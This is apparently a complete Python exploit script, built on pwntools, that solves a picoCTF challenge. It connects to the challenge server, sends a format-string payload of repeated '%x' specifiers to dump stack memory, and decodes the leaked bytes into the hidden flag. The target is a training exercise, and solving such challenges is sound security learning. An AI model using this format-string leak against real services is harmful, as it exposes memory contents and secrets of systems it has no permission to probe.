#!/usr/bin/env python3

from pwn import *

# string to write to
output = ''

# open up remote connection
r = remote('mercury.picoctf.net', 53437)

# get to vulnerability
r.recvuntil('View my')
r.send('1\n')
r.recvuntil('What is your API token?\n')

# send string to print stack
r.send('%x' + '-%x'*40 + '\n')

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

# remove unwanted components
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
  if len(i) == 8:
    array = bytearray.fromhex(i)

    # Invert byte order for endianness
    for byte in reversed(array):
      # Check if the byte is a printable ASCII character
      if byte > 32 and byte < 128:
        # Convert the byte to a character
        output += chr(byte)

# print string
print(output)